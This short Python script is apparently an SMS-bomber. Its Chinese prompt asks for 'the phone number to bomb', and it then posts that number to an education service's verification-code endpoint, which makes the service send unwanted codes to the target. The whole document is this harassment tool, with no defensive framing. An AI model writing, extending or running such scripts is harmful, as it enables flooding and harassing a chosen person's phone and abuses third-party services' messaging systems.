import requests

phoneNumber=input('输入要轰炸的手机号码')
#小麦助教
a=requests.post('https://api-b.xiaomai5.com/b/send/authcode?p=w',{'phone':phoneNumber})
